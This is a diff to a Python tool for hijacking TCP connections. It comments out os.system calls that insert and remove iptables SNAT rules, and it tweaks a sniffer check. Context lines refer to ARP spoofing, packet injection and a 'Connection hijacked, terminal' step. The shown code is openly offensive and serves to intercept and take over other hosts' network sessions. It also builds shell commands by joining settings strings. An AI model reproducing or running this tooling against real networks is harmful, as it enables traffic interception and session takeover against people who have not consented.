@@ -70,21 +70,21 @@ def main():
                 exit()
             print("arp spoofing mac, sleeping 5seconds")
     # TODO: Delete this rule after program is running
-    print("trying:")
-    print("iptables -t nat -A POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
-    os.system("iptables -t nat -A POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
-    settings.cmd_list.append("iptables -D POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
+    #print("trying:")
+    #print("iptables -t nat -A POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
+    #os.system("iptables -t nat -A POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
+    #settings.cmd_list.append("iptables -D POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
     if args.own is not None and len(settings.ip) == 0:
-        print("trying:")
-        print("iptables -D POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
+        #print("trying:")
+        #print("iptables -D POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
         # TODO: Delete this rule after program is running
-        os.system("iptables -D POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
-        settings.cmd_list.append("iptables -t nat -A POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
+        #os.system("iptables -D POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
+        #settings.cmd_list.append("iptables -t nat -A POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
         #spoofer.start(settings.ip, settings.src, settings.dst)
         time.sleep(5)
     #injector.init()
     sniffer.start(settings.src, settings.dst, settings.port)
-    if sniffer.inject_packet == False:
+    if sniffer.inject_packet is None:
         print("Failed to get a packet sample.")
         exit()
     print("Connection hijacked, terminal:")
